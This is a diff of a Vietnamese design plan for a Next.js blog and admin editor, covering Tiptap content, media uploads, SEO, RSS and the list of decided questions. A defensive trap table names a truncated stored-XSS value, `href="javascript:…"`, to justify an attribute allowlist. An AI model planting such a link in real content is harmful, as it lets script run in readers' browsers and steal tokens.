+| Nội dung feed | `excerpt` (plain text) + link "đọc tiếp" | Toàn bài, đọc được ngay trong reader |
+| Chi phí | 0 — `excerpt` luôn có sẵn (§2.3b) | Một đường sinh HTML thứ hai: tự escape, tự map từng node, tự giữ đồng bộ với renderer React mãi mãi |
+| Rủi ro | Không | Dựng lại đúng cái đường nhả HTML mà §3 xoá. Sai một chỗ escape là XSS trong reader của người khác |
+
+Chọn **(a)**: feed tóm tắt là chuẩn quen thuộc, và nó giữ nguyên tính chất "FE **không có cách
+nào** nhả HTML thô" — thứ §3 gọi là an toàn do kiến trúc chứ không do kỷ luật. Nếu sau này
+thật sự cần full-content feed thì đó là một quyết định riêng, và lúc đó `postContentToHtml()`
+phải nằm **cạnh** renderer React trong `packages/ui/src/blog/`, dùng chung một bảng map node —
+không phải một bản sao thứ hai đặt trong Route Handler.
 
 ---
 
@@ -333,8 +867,34 @@ danh sách hiện sai trạng thái). Không có nhu cầu thật thì đừng l
 | `/posts` | Bảng: tiêu đề, trạng thái (badge), tác giả, `updatedAt`. Lọc `status`, tìm `q`. Dùng lại `table`/`pagination`/`badge` đã có ở `packages/ui` |
 | `/posts/new` | Tạo nháp rồi `router.replace` sang `/posts/[id]` ngay — để mọi thao tác sau chỉ có một đường lưu, không phải hai nhánh create/update |
 | `/posts/[id]` | Editor: nội dung bên trái, panel SEO bên phải |
+| `/posts/categories` | Quản lý chuyên mục (§7.1a) — tách khỏi `/posts` vì nó thao tác trên tập khác |
 
-Thêm `{ href: "/posts", label: "Bài viết" }` vào `NAV_ITEMS`.
+Thêm `{ href: "/posts", label: "Bài viết" }` vào `NAV_ITEMS`. Chuyên mục **không** thành mục
+nav riêng — vào từ trong `/posts`, vì nó là màn hình dùng vài lần một năm.
+
+### 7.1a Chuyên mục và thẻ trong editor
+
+Hai trục (§2.6) nên hai kiểu nhập liệu khác nhau — đây không phải chuyện thẩm mỹ, nó phản ánh
+đúng việc tập giá trị nào là cố định:
+
+| | Chuyên mục | Thẻ |
+| --- | --- | --- |
+| Control | **Select một giá trị**, không cho gõ tự do | Multi-select có tìm kiếm, **cho tạo mới tại chỗ** |
+| Nguồn | `GET /admin/blog/categories` | `GET /admin/blog/tags` |
+| Tạo mới | ❌ — phải sang `/posts/categories` | ✅ gõ tên rồi Enter → `POST /admin/blog/tags` (§2.2) |
+| Bắt buộc | ✅ khi Publish (§7.4), trống khi lưu nháp thì vẫn lưu được | ❌ bao giờ cũng tuỳ |
+
+Cho gõ tự do ở ô chuyên mục là mở lại đúng cái cửa mà §2.6 vừa đóng: chỉ cần một lần gõ nhầm
+`Hướng dẫn` thay vì chọn `Hướng dẫn` có sẵn là site có hai chuyên mục trùng tên, hai URL, và
+nav hiện cả hai.
+
+**Màn hình `/posts/categories`** — dùng lại `table` + `dialog` đã có ở `packages/ui`: tạo, đổi
+tên, đổi mô tả, đổi thứ tự hiện ở nav, xoá (chỉ khi rỗng — 409 `CATEGORY_NOT_EMPTY` hiện thành
+câu "Còn N bài trong mục này", không phải toast lỗi trơ).
+
+⚠️ **Đổi `slug` chuyên mục phải cảnh báo như đổi slug bài** (§7.2), nhưng nặng hơn một bậc: bài
+có bảng `blog_post_slugs` đỡ đòn (§2.4), **chuyên mục thì không** (§2.6). Câu cảnh báo phải nói
+thẳng là URL cũ sẽ **404 vĩnh viễn**, không phải "sẽ được chuyển hướng".
 
 ### 7.2 Panel SEO — hiện preview, đừng chỉ hiện input
 
@@ -343,26 +903,37 @@ cắt ~60 ký tự, description ~155), preview thẻ OG, đếm ký tự có c�
 chặn lưu), và slug với nút "sinh từ tiêu đề" (bỏ dấu tiếng Việt).
 
 ⚠️ Khi bài **đã publish** mà người dùng sửa slug: phải cảnh báo ngay tại chỗ, kèm câu "URL cũ
-sẽ được chuyển hướng 301" (nếu đã làm §2.4) hoặc "link cũ sẽ hỏng" (nếu chưa). Đừng để nó
-lặng lẽ như một field bình thường.
+sẽ được chuyển hướng 301" (§2.4). Đừng để nó lặng lẽ như một field bình thường.
 
 ### 7.3 Lưu, mất bài, và ghi đè
 
+**✅ Đã chốt — mô hình lưu:** một bản nội dung duy nhất, **sửa thẳng bản live**, và
+**chỉ lưu khi bấm nút**. Không autosave, kể cả với bài nháp.
+
+Hệ quả phải chấp nhận, ghi ra để sau này không ai tưởng là bug:
+
+- Sửa bài đã publish là sửa **thẳng cái đang hiển thị công khai** — bấm Lưu là độc giả thấy
+  ngay (chậm nhất sau `revalidate`). Không có bản nháp chờ duyệt.
+- Không autosave nghĩa là **mất điện là mất bài**. Đổi lại: không có bản dở nào tự động đẩy
+  lên public, và backend chỉ cần một cột nội dung. Nếu sau này thấy đau thì thêm autosave
+  vào `localStorage` (khôi phục cục bộ, không gửi server) — rẻ và không đụng contract.
+
 Ba thứ phải có, thiếu cái nào cũng dẫn tới mất công viết:
 
-- **Autosave** bản nháp (debounce ~2s hoặc khi blur), hiện trạng thái "Đã lưu 14:32".
-  Không autosave bài **đã published** — người viết sửa nửa chừng không có nghĩa là muốn đẩy
-  bản dở lên public. 🔸 Sửa bài đã publish thì làm gì: sửa thẳng bản live, hay tách bản nháp
-  chờ publish lại? Bản nháp riêng đúng hơn nhưng đắt hơn nhiều ở backend (hai bản nội dung).
-- **Chặn rời trang khi chưa lưu** — `beforeunload` + chặn điều hướng nội bộ.
+- **Trạng thái lưu hiển thị rõ**: "Có thay đổi chưa lưu" / "Đã lưu 14:32". Vì không autosave
+  nên chỉ báo này là thứ duy nhất người viết dựa vào.
+- **Chặn rời trang khi chưa lưu** — `beforeunload` + chặn điều hướng nội bộ. Bắt buộc, không
+  phải tuỳ chọn: đây là lưới an toàn duy nhất thay cho autosave.
 - **Optimistic locking.** `PATCH` gửi kèm `version` đang giữ; backend thấy lệch thì trả 409
   `POST_CONFLICT`. Không có thì hai tab của cùng một người (chuyện rất hay xảy ra khi soạn bài
   dài) sẽ âm thầm ghi đè lẫn nhau. UI: báo "bản trên server đã đổi" + cho chọn tải lại.
 
 ### 7.4 Nút Publish
 
-Dialog xác nhận có checklist: thiếu `metaDescription` / thiếu ảnh bìa / slug còn dạng
-`bai-viet-khong-ten` thì cảnh báo trước khi cho bấm. Cùng tinh thần với dialog moderation ở
+Dialog xác nhận có checklist: **chưa chọn chuyên mục** / thiếu `metaDescription` / thiếu ảnh
+bìa / slug còn dạng `bai-viet-khong-ten` thì cảnh báo trước khi cho bấm. Riêng chuyên mục là
+**chặn cứng**, không phải cảnh báo mềm — backend cũng sẽ trả `POST_NOT_PUBLISHABLE` (§2.2), nên
+để người dùng bấm rồi mới báo lỗi là bắt họ đi hai vòng. Cùng tinh thần với dialog moderation ở
 `admin-plan.md` §3b: hành động nhìn thấy được từ ngoài thì không cho xảy ra bằng một cú click.
 
 ---
@@ -374,7 +945,7 @@ Vấn đề: bài nháp không có ở public (backend trả 404), nên không x
 
 | | Preview **trong** admin (đề xuất) | Draft Mode của Next ở web |
 | --- | --- | --- |
-| Cách làm | Render nội dung bằng đúng renderer, trong khung admin | Cookie draft mode + endpoint đọc bài nháp có token |
+| Cách làm | Render cùng một Tiptap JSON bằng đúng renderer, trong khung admin | Cookie draft mode + endpoint đọc bài nháp có token |
 | Chi phí | thấp | cao: web phải có đường đọc bài nháp — mở đúng cái cửa mà §5 vừa đóng |
 | Độ trung thực | thiếu CSS/layout thật của web | y hệt bản thật |
 
@@ -386,17 +957,35 @@ không nên nằm trong `apps/web`: một code path thì preview không bao gi�
 
 ## 9. Ảnh và media
 
-🔸 **Chưa có endpoint upload nào trong spec.** Ba lựa chọn, khác nhau nhiều về chi phí:
+**✅ ĐÃ LÀM — upload từ editor, qua module `media` của backend.** Kế hoạch cũ ở mục này
+("đợt này dán URL, đợt sau lưu thẳng trên VPS, không nhận SVG") đã bị thay: backend
+chọn **MinIO self-host** nói S3 API và luồng **presigned ba nhịp**, nên FE không bao giờ
+đẩy file qua API. Thiết kế đầy đủ: `docs/media.md` bên repo `noalhub-be`; phần FE:
+`docs/media.md` của repo này.
 
-1. **Không upload** — chỉ dán URL ảnh có sẵn. Rẻ nhất, đủ để bắt đầu, xấu về UX.
-2. **`POST /admin/blog/media`** ở NestJS, lưu vào volume + phục vụ qua nginx. Kéo theo:
-   giới hạn dung lượng, whitelist MIME, và ⚠️ **không phục vụ file người dùng upload từ cùng
-   origin với app** — SVG chứa script là XSS. Dùng subdomain riêng cho ảnh.
-3. **Object storage** (S3/R2) + presigned URL. Đúng nhất về lâu dài, nhiều việc nhất bây giờ.
+Dán URL **vẫn còn**, làm đường phụ cho ảnh đã nằm sẵn trên host được phép (Unsplash).
 
-Việc này độc lập với blog — có thể làm sau, bắt đầu bằng (1).
+Ba ràng buộc của kế hoạch cũ đều được giữ, chỉ khác cách thực hiện:
 
----
+1. ⚠️ **File upload không phục vụ từ origin của app** — `img-noalhub.duckdns.org` tách
+   hẳn khỏi `noalhub.duckdns.org`, và `Content-Disposition: attachment` cho thứ không
+   phải ảnh.
+2. **Allowlist MIME + đối chiếu magic bytes** ở nhịp `complete` — backend không tin
+   `Content-Type` client khai.
+3. **Đổi tên file** (uuid + shard đã băm, tên gốc không bao giờ vào key) và **giới hạn
+   dung lượng theo `kind`**.
+
+Khác một điểm, cố ý: **SVG ĐƯỢC nhận**, thay vì cấm. Đổi lại là ba lớp chặn bắt buộc
+có cả ba — backend sanitize bằng DOMPurify rồi ghi đè object, nginx trả
+`Content-Security-Policy: sandbox` cho mọi `.svg`, và **lớp thứ ba là ràng buộc của repo
+này**: SVG chỉ được nhúng qua `next/image` / `<img src>`, **không bao giờ** inline vào
+DOM (`dangerouslySetInnerHTML`, import as component). Inline là cho nó chạy trên origin
+của app, và không lớp nào ở trên cứu được.
+
+`next.config.ts` của **cả hai app** khai host ảnh trong `images.remotePatterns` —
+`apps/admin` cũng cần vì tab Xem trước dùng đúng renderer của trang công khai. Kèm
+`dangerouslyAllowSVG: true` + `contentDispositionType: "attachment"`, nếu không
+`next/image` từ chối mọi SVG ở production trong khi dev vẫn chạy (§6.2).
 
 ## 10. Cây file dự kiến
 
@@ -404,26 +993,39 @@ Việc này độc lập với blog — có thể làm sau, bắt đầu bằng 
 packages/api/src/blog/
   types.ts  schemas.ts  api.ts  hooks.ts  index.ts
   server.ts                       ← server-only, fetch thuần (§4.2)
-packages/api/package.json         ← + "./blog", "./blog/server"
+packages/api/package.json         ← + "./blog", "./blog/server"; + dependency `server-only` (§4.2)
 
 packages/ui/src/blog/
-  post-content.tsx                ← renderer dùng chung web + admin (§8)
+  post-content.tsx                ← renderer Tiptap JSON → React, dùng chung web + admin (§3, §8).
+                                    KHÔNG import @tiptap/* (§3.2)
+  post-content.css                ← typography đi kèm renderer, KHÔNG để ở apps/web (§3.4)
+  table-of-contents.tsx           ← TOC dựng từ chính JSON (§3.3)
+packages/ui/src/
+  pagination-links.tsx            ← phân trang bằng <a href>, cho trang public (§4.5).
+                                    pagination.tsx cũ giữ nguyên cho admin
 packages/core/src/blog/
-  slugify.ts  reading-time.ts  seo.ts   ← helper thuần
+  slugify.ts  reading-time.ts  seo.ts   ← helper thuần (slugify dùng cho cả slug bài và anchor §3.3)
 
 apps/web/app/
   layout.tsx                      ← sửa metadata + lang (§6.1)
   robots.ts  sitemap.ts
-  (public)/blog/
-    page.tsx                      ← revalidate = 60
-    [slug]/page.tsx               ← generateMetadata + generateStaticParams + JSON-LD
-    tag/[tag]/page.tsx
-    rss.xml/route.ts
-  api/revalidate/route.ts         ← Phase 2 (§5.2)
+  (public)/
+    layout.tsx                    ← header/footer công khai + breadcrumb (§6.1)
+    blogs/
+      page.tsx                    ← danh sách, dynamic, ?page=N (§4.5)
+      not-found.tsx  error.tsx    ← §6.4
+      [slug]/page.tsx             ← generateMetadata + generateStaticParams (§4.4a) + JSON-LD
+      category/page.tsx           ← redirect("/blogs") (§6.5)
+      category/[slug]/page.tsx    ← trục ĐƯỢC index (§2.6)
+      tag/page.tsx                ← chỉ mục thẻ, noindex (§6.5)
+      tag/[tag]/page.tsx          ← noindex, follow (§2.6)
+      rss.xml/route.ts            ← feed tóm tắt, không full-content (§6.6)
+  api/revalidate/route.ts         ← §5.2 (chốt; cần backend gọi)
 
 apps/admin/
-  app/(protected)/posts/{page.tsx,new/page.tsx,[id]/page.tsx}
+  app/(protected)/posts/{page.tsx,new/page.tsx,[id]/page.tsx,categories/page.tsx}
   components/posts/{post-table,post-editor,seo-panel,publish-dialog}.tsx
+  components/posts/{category-select,tag-multiselect,category-manager}.tsx   ← §7.1a
   app/robots.ts                   ← disallow all
 ```
 
@@ -432,20 +1034,127 @@ apps/admin/
 ## 11. Thứ tự đề nghị
 
 1. **§6.1 nền SEO** — nhỏ, độc lập, sửa được ngay hôm nay, và đang là lỗi thật.
-2. **Chốt §2 + §3 với backend** — chặn mọi thứ còn lại. Làm song song với bước 1.
-3. **`packages/api/src/blog/` + renderer** — hai đường đọc, một renderer.
+2. **Chốt §2 với backend** — mang §2 (kèm **hai trục chuyên mục/thẻ §2.6** — 3 bảng mới +
+   `category_id` NOT NULL khi published, `BlogPostListItemDto` §2.3a, envelope/sort/limit
+   §2.1a, fallback `excerpt` §2.3b, bảng `blog_post_slugs` §2.4, `sitemap-entries` §2.1),
+   allowlist §3.1 **cộng allowlist attribute §3.1a**, `image.width/height` §3.1b,
+   `codeBlock.language` §3.1c, và webhook §5.2b sang repo BE. Chặn mọi bước sau; làm song song
+   với bước 1.
+   ⚠️ §2.6, §3.1a–§3.1c và §2.3a–§2.3b đều đổi **schema/DTO** — bỏ qua bây giờ là migrate
+   `jsonb` và migrate bảng sau. Kèm **seed vài chuyên mục đầu tiên** trong migration, nếu không
+   bài đầu tiên không publish được.
+3. **`packages/api/src/blog/` + renderer** — hai đường đọc, một renderer Tiptap JSON (§3.1),
+   validate attr theo §3.1a, quét heading một lượt cho anchor + TOC (§3.3).
 4. **`apps/admin` editor** — có chỗ nhập liệu thì mới có dữ liệu thật để dựng trang public.
-5. **`apps/web` trang blog + sitemap/RSS/JSON-LD.**
-6. **§5.2 webhook revalidate** — chỉ khi 60 giây là không chấp nhận được.
+   Làm `/posts/categories` (§7.1a) **trước** editor: không có chuyên mục thì ô select rỗng và
+   không publish nổi bài nào.
+5. **`apps/web` trang blog + sitemap/RSS/JSON-LD.** Gồm `(public)/layout.tsx` + nav chuyên mục
+   (§6.1), `PaginationLinks` (§4.5), `generateStaticParams` có try/catch (§4.4a), trang chuyên
+   mục + trang thẻ + bài liên quan + trạng thái rỗng (§6.5), RSS tóm tắt (§6.6).
+6. **§5.2 webhook revalidate** — làm sau khi trang public chạy được bằng ISR thuần.
+   Cần cả backend (§5.2b) và env hạ tầng (§5.2c), nên chốt secret chung ở bước 2 luôn.
 
 ---
 
-## 12. Cần bạn chốt trước khi làm
+## 12. Trạng thái quyết định
 
-1. **Ai viết bài?** → quyết định §3 (Markdown rẻ vs Tiptap đắt).
-2. **`/` là gì?** Landing công khai, hay vẫn là app sau đăng nhập? (§0c, §6.1)
-3. **Publish tức thì hay 60 giây là đủ?** (§5.1 vs §5.2)
-4. **Sửa bài đã publish**: sửa thẳng bản live hay tách bản nháp? (§7.3)
-5. **Ảnh**: dán URL, hay làm upload luôn? (§9)
-6. **Xoá bài**: xoá mềm hay xoá cứng? (§2.2)
-7. **Phân trang `/blog`**: `?page=2` hay `/blog/page/2`? (§4.4)
+### 12.1 ✅ Đã chốt
+
+| Việc | Quyết định | Ở đâu |
+|---|---|---|
+| Định dạng nội dung | **Tiptap JSON** (`jsonb`), renderer tự viết, không có đường ra HTML thô | §3 |
+| Allowlist node/mark | Danh sách cố định; backend validate theo đúng nó khi ghi | §3.1 |
+| Đường đọc trang public | **Server-only** `blog/server.ts` (`fetch` + ISR), vì SEO | §4 · `data-layer.md` §7 |
+| Sửa bài đã publish | **Sửa thẳng bản live**, không có bản nháp song song | §7.3 |
+| Cách lưu | **Chỉ lưu khi bấm nút**, không autosave; bắt buộc có chặn rời trang | §7.3 |
+| Xoá bài | **Xoá mềm** (`status = archived`), không xoá cứng | §2.2 |
+| Ảnh | **Upload presigned ba nhịp** lên MinIO self-host; dán URL là đường phụ | §9 |
+| SVG | **Được nhận**, đổi lại ba lớp chặn bắt buộc — kể cả ràng buộc "không inline vào DOM" của FE | §9 |
+| Publish lên sóng lúc nào | **Phương án B** — backend gọi webhook revalidate; ISR 60s là lưới an toàn | §5.2 |
+| `sitemap-entries` | **Endpoint riêng**, không phân trang | §2.1 |
+| Lịch sử slug | **Có bảng `blog_post_slugs`**; FE `permanentRedirect` 301 sang slug mới | §2.4 |
+| Trang `/` | **Giữ trong `(protected)`** — không làm landing đợt này; `robots` disallow `/` | §6.1 |
+| Trang lỗi blog | `not-found.tsx` (404) + `error.tsx` (500) riêng cho `/blogs` | §6.4 |
+| Danh sách & phân trang | **`/blogs?page=N`** — route dynamic, cache ở tầng `fetch` + `revalidateTag` | §4.5 |
+| URL công khai | **Số nhiều `/blogs`** (`/blogs/[slug]`); path API backend giữ số ít `/blog/...` | §1 |
+| Đường gọi giữa hai container | **Nội bộ qua docker network**; `/api/revalidate` bị `deny all` ở nginx | §4.3 · §5.2c |
+
+**Bổ sung ở vòng rà 2 (2026-08-30):**
+
+| Việc | Quyết định | Ở đâu |
+|---|---|---|
+| Allowlist **attribute** | `href`/`src` chỉ scheme an toàn, `rel`/`target` do renderer đặt, attr lạ bị loại khi ghi | §3.1a |
+| Node `image` | Có `width`/`height` **ngay đợt 1** — thêm sau là migrate `jsonb` | §3.1b |
+| `codeBlock` | Lưu `language` trong allowlist; **chưa** syntax highlighting | §3.1c |
+| Nội dung RSS | **Chỉ `excerpt`**, không full-content — giữ nguyên "không có đường nhả HTML thô" | §6.6 |
+| Phân trang public | Component thứ hai `PaginationLinks` bằng `<a href>`; `pagination.tsx` cũ giữ cho admin | §4.5 |
+| `generateStaticParams` | **`try/catch → []`** — build FE không được phụ thuộc backend đang sống | §4.4a |
+| Webhook body | `{ slugs[], tags[] }` + **chỉ dùng `revalidateTag`** (5 tag), không `revalidatePath` | §5.2 |
+| `readingMinutes` | **Backend trả** trong list item — FE không có `contentText` ở danh sách | §2.3a |
+| `excerpt` rỗng | **Backend tự sinh** từ `contentText` lúc ghi → list item không nullable | §2.3b |
+| Envelope + sort | `{ items, total, page, limit }` như `AdminUserList`; public `publishedAt DESC`, admin `updatedAt DESC` | §2.1a |
+| Trang chuyên mục | **CHO index** + vào sitemap + lên nav — trục SEO chính | §2.6 · §6.5 |
+| Trang thẻ | **`noindex, follow`**, không vào sitemap, không lên nav | §2.6 · §6.5 |
+| Layout công khai | `(public)/layout.tsx` riêng — header/footer/breadcrumb | §6.1 |
+| Bài liên quan | Dùng lại `GET /blog/posts?category=…&limit=4`, **không** thêm endpoint | §2.5 |
+| Anchor + TOC | `slugify` + hậu tố khi trùng, quét cây một lượt; TOC từ JSON, ẩn khi < 3 heading | §3.3 |
+| Typography | Ở `packages/ui/src/blog/` cùng renderer, không ở `apps/web` | §3.4 |
+
+**Hai trục phân loại — chốt 2026-08-30:**
+
+| Việc | Quyết định | Ở đâu |
+|---|---|---|
+| Mô hình phân loại | **Hai trục**: `category` (1 bài 1 mục, tập cố định) + `tags` (0..n, mọc theo bài) | §2.6 |
+| Kiểu dữ liệu | Cả hai là **entity `{ slug, name }`**, KHÔNG phải `string[]` — tách slug URL khỏi tên hiển thị | §2.6 |
+| Bảng ở BE | `blog_categories`, `blog_tags`, `blog_post_tags`, + `blog_posts.category_id` | §2.6 |
+| Chuyên mục bắt buộc | ✅ khi **publish**, không bắt buộc khi lưu nháp | §2.6 · §7.4 |
+| Cây chuyên mục | **Phẳng**, không cha–con | §2.6 · §1 |
+| Trục nào được index | **Chỉ chuyên mục.** Thẻ `noindex, follow` — tránh hàng chục URL gần trùng | §2.6 · §6.5 |
+| URL bài | Vẫn **phẳng** `/blogs/[slug]`, KHÔNG lồng chuyên mục — dời mục không được đổi URL bài | §2.6 |
+| Đổi slug chuyên mục | **Không có bảng lịch sử** như bài; URL cũ 404 → admin phải cảnh báo rõ | §2.6 · §7.1a |
+| Xoá chuyên mục | **Chỉ khi rỗng**, còn bài thì 409 `CATEGORY_NOT_EMPTY` | §2.2 · §2.6 |
+| Tạo thẻ mới | Ngay trong editor (`POST /admin/blog/tags`, trùng thì trả thẻ cũ) | §2.2 · §7.1a |
+| Chọn chuyên mục | **Select**, không cho gõ tự do — gõ tự do là đẻ mục trùng tên | §7.1a |
+| Slug cấm dưới `/blogs` | Nay là **ba**: `category`, `tag`, `rss.xml` | §4.5 |
+
+### 12.2 Còn lại — không chặn gì
+
+Backend đã implement xong §2 (§11 bước 2 hoàn tất). Ba thứ để quyết sau, đều không khoá đường nào:
+
+- **OG image động** bằng `ImageResponse` — cần nhúng sẵn file font vào image Docker; rẻ hơn thì
+  dùng `coverImageUrl` của bài (§6.3).
+- **410 cho bài `archived`** thay vì 404 (§6.5).
+- **Full-content RSS** (§6.6) — chỉ mở lại nếu có người thật sự đọc feed trong reader.
+
+### 12.3 Bẫy tìm được ở vòng rà 2 — đọc trước khi code
+
+Sáu chỗ sẽ **vỡ thật lúc triển khai**, không phải chuyện thẩm mỹ. Đã chèn vào từng §, liệt kê
+lại đây để không phải đi tìm:
+
+| # | Vỡ ở đâu | Triệu chứng nếu bỏ qua | §  |
+|---|---|---|---|
+| 1 | `generateStaticParams` gọi API lúc build | Backend sập/deploy trùng lúc → **build FE đỏ**, lỗi hiện ở feature không liên quan | §4.4a |
+| 2 | `Pagination` là nút bấm, không phải link | Crawler không đi được từ trang 2 trở đi → mất toàn bộ internal linking | §4.5 |
+| 3 | RSS cần HTML string, §3 cấm nhả HTML | Không viết được `rss.xml` nếu không phá kiến trúc §3 | §6.6 |
+| 4 | Allowlist §3.1 không chặn giá trị attr | `href="javascript:…"` là mark **hợp lệ** → stored XSS, đọc token mọi user | §3.1a |
+| 5 | Webhook `{ slug }`, chỉ 3 lệnh revalidate | Đổi slug mất bản cũ; trang tag trễ 300s, RSS trễ 3600s sau khi unpublish | §5.2 |
+| 6 | `image` không có `width`/`height` | `next/image` không dùng được tử tế → CLS, đúng chỉ số SEO plan này nhắm tới | §3.1b |
+
+### 12.4 Sai lệch giữa plan và bản đã implement (2026-08-31)
+
+Bảy chỗ bản chạy thật **khác** với plan. Cái nào cũng có lý do, và cái nào cũng đã
+được ghi tại chỗ trong code — liệt kê lại đây để đọc plan không bị hiểu nhầm.
+
+| # | Plan nói | Thực tế | Vì sao |
+|---|---|---|---|
+| 1 | §4.4: `/blogs/category/[slug]`, `/blogs/tag/[tag]` là **ISR `revalidate = 300`** | **Dynamic**, cache ở tầng `fetch` | Hai trang có phân trang nên chúng đọc `searchParams` — request-time API. Khai `generateStaticParams` cùng lúc làm Next cố tĩnh hoá rồi chết `DYNAMIC_SERVER_USAGE` **lúc chạy**, không phải lúc build. Đây đúng là đánh đổi §4.5 đã chấp nhận cho `/blogs`, chỉ là nó lan sang hai trang này |
+| 2 | §4.4: `sitemap.ts`, `rss.xml`, `/blogs/tag` là ISR | **`force-dynamic`** | Bản prerender lúc build là bản **rỗng** (backend không với tới được từ CI, §4.4a), và nó sống tới hết `revalidate` — tức **sitemap rỗng cả tiếng sau mỗi lần deploy**. Đo được lúc smoke test. Tải backend không đổi vì `fetch` vẫn cache |
+| 3 | §4.4a chỉ nói `generateStaticParams` | Luật áp cho **mọi route prerender lúc build** | `rss.xml` đã làm **đỏ build thật** ngay lần chạy đầu — §4.4a phát biểu đúng luật nhưng liệt kê thiếu chỗ áp dụng |
+| 4 | §2.2: publish bắt buộc có `metaDescription` | **Không bắt buộc** | Mâu thuẫn với chính §7.4 ("riêng chuyên mục là chặn cứng", meta description chỉ cảnh báo mềm). §7.4 thắng vì §2.3b đã bảo đảm `excerpt` luôn có. Bắt buộc ở backend sẽ biến cảnh báo mềm của FE thành lời nói dối |
+| 5 | §4.3/§5.2c: `http://api:3101` | **`http://app:3000`** | Service backend trong `docker-compose.prod.yml` tên là `app`, cổng container 3000. Đúng chỗ §5.2c dặn "đừng chép mù" — và nó sai thật |
+| 6 | §2.4: redirect slug cũ là **301** | **308** | `permanentRedirect` của Next không cho chọn mã. Google xử lý 308 y hệt 301; khác biệt duy nhất (giữ HTTP method) không liên quan tới một trang đọc bằng GET |
+| 7 | — (không có trong plan) | Bỏ chuyên mục của bài **đang đăng** → 422 | CHECK constraint ở DB chặn, nhưng service không chặn trước nên lỗi thô của Postgres lọt ra thành **500**. Ô chuyên mục trong editor có mục "— Chưa chọn —" nên ai cũng bấm được. Nay backend trả 422 có câu chữ, và FE bỏ luôn mục rỗng khi bài đang đăng |
+
+Ngoài ra, hai file helper ở `packages/core/src/blog/` nhiều hơn §10 dự kiến:
+`headings.ts` (quét heading một lượt, dùng chung giữa renderer và mục lục — §3.3 yêu cầu
+nhưng §10 quên liệt kê) và `error-message.ts` (thông điệp lỗi riêng của blog cho admin).
